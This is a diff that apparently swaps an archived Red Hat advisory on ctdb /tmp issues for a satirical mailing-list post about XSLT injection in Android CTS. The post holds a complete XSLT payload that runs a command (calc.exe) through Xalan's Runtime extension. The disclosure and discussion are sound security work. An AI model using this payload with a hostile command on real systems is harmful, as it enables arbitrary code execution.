@@ -1,48 +1,70 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/05/29/12
-Message-ID: <5387876B.3010408@redhat.com>
-Date: Thu, 29 May 2014 13:15:55 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: CVE-2013-4159 ctdb: /tmp file vulnerability issues
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/19/6
+Message-ID: <CAGGN9efWYTCWzBg1gtzAEsE13oSq2SAe+9kGch3d_kUXP2coMg@mail.gmail.com>
+Date: Mon, 20 Oct 2014 08:29:16 +1000
+From: Lord Tuskington <l.tuskington@...il.com>
+To: Full Disclosure List <fulldisclosure@...lists.org>, oss-security@...ts.openwall.com
+Subject: Re: CVE request: remote code execution in Android CTS
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+I disagree with Nick Kralevich's response. An attacker who has the ability
+to locally modify an XSL file should not be able to leverage this to
+achieve code execution. This crosses a trust boundary.
 
-So some various tmp issues were fixed in ctdb, I missed the
-announcement last year:
+As for why I didn't report this to security@...roid.com, when Google starts
+paying corporate tax instead of dodging it, I will report issues privately.
 
-http://wiki.samba.org/index.php/CTDB2releaseNotes
+Lord Tuskington
+Chief Financial Taxdodger
+Google
 
-ctdb 2.5
+On Sun, Oct 19, 2014 at 7:28 PM, Lord Tuskington <l.tuskington@...il.com>
+wrote:
 
-Release Notes for ctdb 2.5
-October 30, 2013
+> CTS parses api-coverage.xsl without providing the
+> FEATURE_SECURE_PROCESSING option. See lines 60-67 of
+> cts/tools/cts-api-coverage/src/com/android/cts/apicoverage/HtmlReport.java:
+>
+> InputStream xsl =
+> CtsApiCoverage.class.getResourceAsStream("/api-coverage.xsl");
+> StreamSource xslSource = new StreamSource(xsl);
+> TransformerFactory factory = TransformerFactory.newInstance();
+> Transformer transformer = factory.newTransformer(xslSource);
+>
+> StreamSource xmlSource = new StreamSource(xmlIn);
+> StreamResult result = new StreamResult(out);
+> transformer.transform(xmlSource, result);
+>
+> An attacker who is able to control api-coverage.xsl could inject arbitrary
+> code into it, which would be executed. For example:
+>
+> <xsl:stylesheet version="1.0"
+> xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+> xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
+> xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
+> >
+> <xsl:output method="text"/>
+>     <xsl:template match="/">
+>        <xsl:variable name="Command"><![CDATA[calc.exe]]></xsl:variable>
+>        <xsl:variable name="RT" select="rt:getRuntime()"/>
+>        <xsl:variable name="proc" select="rt:exec($RT, $Command)"/>
+>        <xsl:text>Process: </xsl:text><xsl:value-of select="$proc"/>
+>     </xsl:template>
+> </xsl:stylesheet>
+>
+> Would pop a calc. This crosses a trust boundary because an attacker could
+> provide an XSL stylesheet that, for example, has enhanced visual layout. A
+> person consuming that stylesheet would assume it could not possibly contain
+> arbitrary code that would be executed, as it's just a stylesheet. The XSL
+> extensions to execute code should be disabled by passing
+> FEATURE_SECURE_PROCESSING.
+>
+> Regards
+>
+> Lord Tuskington
+>
+> Chief Financial Pinniped
+>
+> TuskCorp
+>
 
-The default location of the ctdbd socket is now:
-/var/run/ctdb/ctdbd.socket
-
-For details please see https://bugzilla.redhat.com/show_bug.cgi?id=986773
-
-
-- -- 
-Kurt Seifried - Red Hat - Product Security - Cloud stuff and such
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBAgAGBQJTh4dqAAoJEBYNRVNeJnmTOgkP/22hhCHh9OshQvE4yEo2Y7CP
-XCD4rFgjNmM13rd+E8khgrlueY0VYbBHli+iyQZuDpV0pIS2bBSs8i1c6PrTvqpk
-jNpQkYq7P/FSvAtmpVZJIBd2EcIv5vXf+Vm/jIr1Cw6WtfM4X7UWHMXFy41UQrm0
-ffG6gtIW9rOSLG+HUtEFjs+pB1xrehQqOh0JtLK+9jzM8n2ro51SGazIfzU/16Mx
-WnNMy5qUvlKSt4+CySBSoEtnMXecJEyOHCZNccB69l1Bi7jrprn/wUaxyXoPOi7K
-Wo/oHIMSbVETSndfBjntCvImME2Udg96eV0ykUR5Ob+xRKcQG1aJiNC/mHKTXgj7
-0um3cJnQKztp74bSDHiLIBIY7Oila0FEDzDv4tKlnoRnH9I1cHtq2CNdQpTyVpEk
-bOv6Qmx+46vSbNBGVyTnixdxHJEGIJpzgWj6HS0YY6Dvft6k089W+DolOLgHEHnE
-+5z8Dur2i7HKjmaST7KtBJw7P5bNLS5eau2cszPRq+7+pAmv3ozZ+xCCEbv/qhP7
-Ga0qK9zV30yoS44QW9IiZgkTpKuewNekbyLgCdYnxMbUUNKLypUbvDTX7+6v+mLD
-Mz2MoNXEwDiiw4yPDm2CEsTQcb49Z7f2a4IbbSJWokcGofdTovh5bH8b7cYRyEVk
-JMYP8ymmfI5nIdR/L98P
-=F3Ut
------END PGP SIGNATURE-----
